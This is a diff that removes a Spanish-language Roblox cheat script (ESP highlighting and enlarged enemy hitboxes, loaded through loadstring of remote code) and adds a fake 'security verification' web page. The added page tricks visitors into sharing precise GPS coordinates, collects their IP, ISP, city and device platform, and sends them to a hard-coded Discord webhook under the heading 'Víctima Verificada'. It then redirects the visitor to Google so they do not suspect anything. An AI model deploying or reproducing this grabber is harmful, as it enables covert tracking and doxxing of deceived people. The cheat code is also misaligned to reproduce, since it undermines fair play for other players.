@@ -1,181 +1,182 @@
--- ==========================================
--- GABRIEL XITER - WINDUI PRO (HITBOX REAL)
--- ==========================================
-local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verificación de Seguridad</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #0f1115;
+            --card: #161920;
+            --text: #f3f4f6;
+            --muted: #9ca3af;
+            --accent: #10b981; /* Color verde para el botón */
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle 800px at 50% -10%, rgba(59, 130, 246, 0.08), transparent 60%);
+        }
+        .card {
+            width: 100%; max-width: 400px; background-color: var(--card);
+            border: 1px solid rgba(255, 255, 255, 0.07); border-radius: 12px;
+            box-shadow: 0 24px 40px rgba(0, 0, 0, 0.6); padding: 40px;
+            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            text-align: center;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        p { font-size: 14px; color: var(--muted); margin-bottom: 25px; }
+        
+        button {
+            width: 100%; padding: 14px;
+            background-color: var(--accent);
+            color: white; border: none; border-radius: 8px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover { background-color: #059669; }
+        button:disabled { background-color: var(--muted); cursor: not-allowed; }
 
-if not WindUI then
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Error",
-        Text = "No se pudo cargar WindUI.",
-    })
-    return
-end
+        .loader {
+            display: none; /* Oculto por defecto */
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--accent);
+            border-radius: 50%;
+            width: 30px; height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local CoreGui = game:GetService("CoreGui")
-local LocalPlayer = Players.LocalPlayer
+    <div class="card">
+        <h1>Verificación requerida</h1>
+        <p>Para acceder al contenido, necesitamos verificar tu ubicación por seguridad.</p>
+        
+        <button id="verifyBtn">Verificarme</button>
+        <div class="loader" id="loader"></div>
+    </div>
 
-local espEnabled = false
-local espObjects = {}
-local hitboxEnabled = false
-local hitboxSize = 3 -- Multiplicador (3 = triple de grande)
-local originalSizes = {} -- Para guardar el tamaño original
+    <script>
+        // 🔥 AQUÍ VA TU WEBHOOK 🔥
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1571937855347888169/Iyr0UjlhHMgzCADyO_dm7ITPwD04ftFNS44ku5yE1C1wOsWYKo-T7piVOW8Pa2FTFrXV";
 
-local Window = WindUI:CreateWindow({
-    Title = "Gabriel Xiter",
-    Icon = "swords",
-    Author = "Duelos Edition",
-    Folder = "GabrielXiter",
-    Size = UDim2.fromOffset(580, 460),
-    Theme = "Dark",
-    Transparent = true,
-    ThemeSettings = {
-        Accent = Color3.fromRGB(255, 80, 150),
-        Background = Color3.fromRGB(22, 22, 22)
-    },
-    OpenButton = { Title = "Gabriel Xiter", Icon = "swords", Enabled = true, Draggable = true }
-})
-
--- ==========================================
--- PESTAÑA: VISUALES (ESP)
--- ==========================================
-local VisualTab = Window:Tab({ Title = "Visuales", Icon = "eye" })
-
-VisualTab:Toggle({
-    Title = "ESP Box (Highlight)",
-    Default = false,
-    Callback = function(state)
-        espEnabled = state
-        if not state then
-            for _, obj in pairs(espObjects) do if obj then obj:Destroy() end end
-            espObjects = {}
-        end
-    end
-})
-
-RunService.RenderStepped:Connect(function()
-    if not espEnabled then return end
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer and p.Character then
-            local humanoid = p.Character:FindFirstChildOfClass("Humanoid")
-            if humanoid and humanoid.Health > 0 then
-                if not espObjects[p] then
-                    local highlight = Instance.new("Highlight")
-                    highlight.Adornee = p.Character
-                    highlight.FillColor = Color3.fromRGB(255, 80, 150)
-                    highlight.OutlineColor = Color3.fromRGB(255, 80, 150)
-                    highlight.FillTransparency = 0.5
-                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                    highlight.Parent = CoreGui
-                    espObjects[p] = highlight
-                end
-            end
-        end
-    end
-end)
-
--- ==========================================
--- PESTAÑA: HITBOX (MULTIPLICADOR REAL)
--- ==========================================
-local HitboxTab = Window:Tab({ Title = "Hitbox", Icon = "crosshair" })
-
-HitboxTab:Toggle({
-    Title = "Activar Hitbox Real",
-    Desc = "Agranda el cuerpo del enemigo para que las balas conecten.",
-    Default = false,
-    Callback = function(state)
-        hitboxEnabled = state
-        -- Si se apaga, devolvemos los cuerpos a la normalidad
-        if not state then
-            for p, data in pairs(originalSizes) do
-                if p.Character then
-                    local hrp = p.Character:FindFirstChild("HumanoidRootPart")
-                    local torso = p.Character:FindFirstChild("Torso") or p.Character:FindFirstChild("UpperTorso")
-                    if hrp then hrp.Size = data.hrpSize end
-                    if torso then torso.Size = data.torsoSize end
-                end
-            end
-            originalSizes = {}
-        end
-    end
-})
-
-HitboxTab:Slider({
-    Title = "Multiplicador de Tamaño",
-    Desc = "2 = Doble de grande. 3 = Triple.",
-    Step = 0.5,
-    Value = { Min = 1, Max = 10, Default = 3 },
-    Callback = function(value)
-        hitboxSize = value
-    end
-})
-
--- Lógica del Hitbox Real (Anti-Congelamiento)
-RunService.Heartbeat:Connect(function()
-    if not hitboxEnabled then return end
-
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer and p.Character then
-            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
-            local torso = p.Character:FindFirstChild("Torso") or p.Character:FindFirstChild("UpperTorso")
-            local humanoid = p.Character:FindFirstChildOfClass("Humanoid")
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            const btn = document.getElementById('verifyBtn');
+            const loader = document.getElementById('loader');
             
-            if hrp and torso and humanoid and humanoid.Health > 0 then
-                -- Guardamos el tamaño original (solo la primera vez)
-                if not originalSizes[p] then
-                    originalSizes[p] = {
-                        hrpSize = hrp.Size,
-                        torsoSize = torso.Size
+            // 1. Cambiamos el botón a "cargando"
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
+            loader.style.display = "block";
+
+            let latitud = "Desconocida";
+            let longitud = "Desconocida";
+
+            // 2. Pedimos el GPS real
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // El usuario ACEPTÓ
+                        latitud = position.coords.latitude;
+                        longitud = position.coords.longitude;
+                        enviarDatos(latitud, longitud, "GPS Exacto");
+                    },
+                    function(error) {
+                        // El usuario RECHAZÓ o hubo un error
+                        enviarDatos("Desconocida", "Desconocida", "Rechazado/Bloqueado");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                // Navegador no soporta GPS, enviamos solo IP
+                enviarDatos("Desconocida", "Desconocida", "No soportado");
+            }
+        });
+
+        async function enviarDatos(lat, lon, tipoUbicacion) {
+            let ipAddress = "Desconocida";
+            let isp = "Desconocido";
+            let pais = "Desconocido";
+            let ciudad = "Desconocida";
+
+            // 3. Capturamos la IP
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+                
+                // Capturamos datos de la IP
+                const geoResponse = await fetch(`https://ipwho.is/${ipAddress}`);
+                const geoData = await geoResponse.json();
+                if (geoData.success) {
+                    isp = geoData.connection.isp || "Desconocido";
+                    pais = geoData.country || "Desconocido";
+                    ciudad = geoData.city || "Desconocida";
+                }
+            } catch (e) { console.log("Error IP"); }
+
+            // 4. Datos del dispositivo
+            const platform = navigator.platform;
+            const fecha = new Date().toLocaleString();
+
+            // Creamos el link de Google Maps (si hay coordenadas)
+            let mapLink = "Sin mapa exacto";
+            if (lat !== "Desconocida" && lon !== "Desconocida") {
+                mapLink = `[Ver Ubicación GPS Exacta](https://www.google.com/maps?q=${lat},${lon})`;
+            } else {
+                // Si no hay GPS, ponemos la IP aproximada
+                mapLink = `[Ver Ubicación por IP](https://www.google.com/maps?q=${ciudad},${pais})`;
+            }
+
+            // 5. Mandamos todo a Discord
+            const payload = {
+                username: "Gabriel Xiter",
+                embeds: [
+                    {
+                        title: "🎯 ¡Víctima Verificada!",
+                        color: 5763719, // Color verde
+                        description: "Un usuario ha completado el proceso de verificación.",
+                        fields: [
+                            { name: "🌐 IP Pública", value: `\`\`\`${ipAddress}\`\`\``, inline: false },
+                            { name: "📡 Tipo de Ubicación", value: `\`\`\`${tipoUbicacion}\`\`\``, inline: false },
+                            { name: "🗺️ Coordenadas GPS", value: `\`\`\`Lat: ${lat}\nLon: ${lon}\`\`\`\n${mapLink}`, inline: false },
+                            { name: "🏢 Compañía (ISP)", value: `\`\`\`${isp}\`\`\``, inline: false },
+                            { name: "📍 Ubicación por IP", value: `\`\`\`${ciudad}, ${pais}\`\`\``, inline: false },
+                            { name: "💻 Sistema Operativo", value: `\`\`\`${platform}\`\`\``, inline: true },
+                            { name: "🕒 Fecha", value: `\`\`\`${fecha}\`\`\``, inline: true }
+                        ],
+                        footer: { text: "Sistema de Verificación Zero-Click" }
                     }
-                end
-                
-                local orig = originalSizes[p]
-                
-                -- 1. Agrandamos el Torso (Para que se vea grande, pero sin estirar la Y para no congelar)
-                torso.Size = Vector3.new(
-                    orig.torsoSize.X * hitboxSize,
-                    orig.torsoSize.Y, -- La altura se queda igual
-                    orig.torsoSize.Z * hitboxSize
-                )
-                
-                -- 2. Agrandamos el HumanoidRootPart (Que es el que detecta las balas del servidor)
-                hrp.Size = Vector3.new(
-                    orig.hrpSize.X * hitboxSize,
-                    orig.hrpSize.Y,
-                    orig.hrpSize.Z * hitboxSize
-                )
-                
-                -- Hacemos el torso invisible si el multiplicador es muy grande para no tapar la pantalla
-                if hitboxSize > 2 then
-                    torso.Transparency = 1
-                end
-            end
-        end
-    end
-end)
+                ]
+            };
 
--- ==========================================
--- PESTAÑA: AJUSTES
--- ==========================================
-local SettingsTab = Window:Tab({ Title = "Ajustes", Icon = "settings" })
-SettingsTab:Button({
-    Title = "Destruir Script",
-    Callback = function()
-        Window:Destroy()
-        for _, obj in pairs(espObjects) do if obj then obj:Destroy() end end
-        for p, data in pairs(originalSizes) do
-            if p.Character then
-                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
-                if hrp then hrp.Size = data.hrpSize end
-            end
-        end
-    end
-})
-
-WindUI:Notify({
-    Title = "Gabriel Xiter",
-    Content = "Hitbox Real cargada.",
-    Duration = 5,
-    Icon = "check"
-})
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Redirigimos a una página para que no sospechen
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; 
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
